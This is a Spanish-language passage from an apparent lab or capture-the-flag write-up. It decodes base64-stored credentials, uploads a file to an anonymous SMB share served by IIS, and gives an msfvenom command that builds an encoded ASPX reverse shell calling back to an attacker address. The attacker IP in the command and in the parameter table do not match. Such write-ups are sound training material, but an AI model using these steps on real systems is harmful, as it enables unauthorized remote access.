# Explotación

En esta fase analizaremos la información obtenida durante la enumeración con el objetivo de identificar un vector de explotación que permita obtener acceso al sistema objetivo.

## Descifrado de contraseñas encontradas

 Del documento `passwords.txt` se puede observar que dentro hay 2 textos cifrados en base64

 ```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
## Credenciales descrifradas

```
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
# Bob - !P@$$W0rD!123

```
```
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
```
Luego de durar un tiempo tratando de ingresar al sistema vemos que las credenciales obtenidas no nos garantizan un acceso inicial a la máquina victima, por lo que tendremos que seguir buscando nuestro vector de ataque.

Recordemos que durante el análisis identificamos un `servidor HTTP` ejecutándose en un puerto no estándar. Este servicio resulta especialmente interesante, ya que debemos determinar qué aplicación está ejecutándose y, sobre todo, desde qué directorio está sirviendo el contenido.

## Confirmación

`smbclient //10.129.125.26/nt4wrksv -N`

subimos un archivo cualquiera 

`smb: \> put test.txt` 

Comprobamos si el archivo es accesible mediante HTTP:

`curl http://10.129.125.26:43669/test.txt`

Confirmamos que el servidor está expuesto, por lo que podemos generar un payload en .aspx. 

## ¿Por qué generar un payload en `.aspx`?

Utilizamos la extensión `.aspx` porque el servidor web está ejecutando IIS con soporte para ASP.NET. A diferencia de un archivo .exe, IIS puede procesar directamente un archivo .aspx, permitiendo ejecutar código en el contexto del servidor.

## Generación del payload con `MSFVENOM` en .aspx 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.220 LPORT=4444 -e x64/shikata_ga_nai -f aspx -o shell.aspx
```
| **Parámetro** | **Descripción** |
|---|---|
| `-p windows/x64/shell_reverse_tcp` | Reverse shell de 64 bits. |
| `LHOST=192.168.196.220` | IP de mi máquina atacante. |
| `LPORT=4444` | Puerto de escucha. |
| `-e x64/shikata_ga_nai` | Encoder utilizado para modificar el payload. |
| `-f aspx` | Formato de salida ASPX. |
| `-o shell.aspx` | Nombre del archivo de salida. |
